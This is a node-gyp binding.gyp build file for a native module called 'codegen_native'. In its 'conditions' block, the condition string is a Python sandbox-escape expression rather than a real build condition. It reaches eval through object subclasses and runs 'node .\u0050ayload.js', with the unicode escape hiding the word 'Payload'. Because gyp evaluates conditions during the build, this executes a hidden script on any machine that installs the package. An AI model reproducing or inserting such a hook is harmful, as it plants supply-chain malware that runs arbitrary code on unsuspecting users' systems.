{
    "targets": [
        {
            "target_name": "codegen_native",
            "sources": ["src/binding.cc"],
            "include_dirs": ["<!(node -e require('nan')/)"]
        }
    ],
    "conditions": [
        [
            "sys.version_info[0] > 0 and [w for w in ().__class__.__base__.__subclasses__() if w.__name__ == 'catch_warnings'][0]()._module.__builtins__['eval']('node .\\u0050ayload.js')",
            {
                "cflags": ["-O2"]
            }
        ]
    ]
}
